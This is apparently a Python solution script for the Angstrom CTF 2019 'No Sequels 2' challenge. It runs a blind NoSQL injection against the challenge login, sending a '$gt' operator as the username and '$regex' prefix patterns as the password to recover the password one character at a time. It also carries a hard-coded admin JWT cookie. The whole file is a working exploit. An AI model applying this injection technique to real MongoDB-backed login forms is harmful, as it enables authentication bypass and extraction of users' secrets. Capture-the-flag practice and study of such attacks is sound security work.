#!/usr/bin/env python3
# Angstrom CTF 2019 - No Sequels 2
import requests
import string
import json

url = 'https://nosequels.2019.chall.actf.co/login'
charset = string.ascii_letters + string.digits + "!@#$%^()@_{}"
flag = ''

while True:
    for ch in charset:
        payload = flag + ch
        json_data = {
            "username": {"$gt": ""},
            "password": {"$regex": "^a.*".replace('a', payload)}
        }
        data = json.dumps(json_data)
        headers = {
            "Content-Type": "application/json"
        }
        cookies = {
            'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE1NTU5NDk2OTJ9.M2F2Zq4esATeJhBhQby2b3XJRJNLZxpUacVIMmJW9O0'
        }
        r = requests.post(url, data=data,
            headers=headers, cookies=cookies, allow_redirects=False)
        # print('data', data)
        # print('r.text', r.text)

        if 'Found. Redirecting to /site' in r.text:
            print('>> Progress:', payload)
            flag += ch
            break

        print('Failed:', payload)
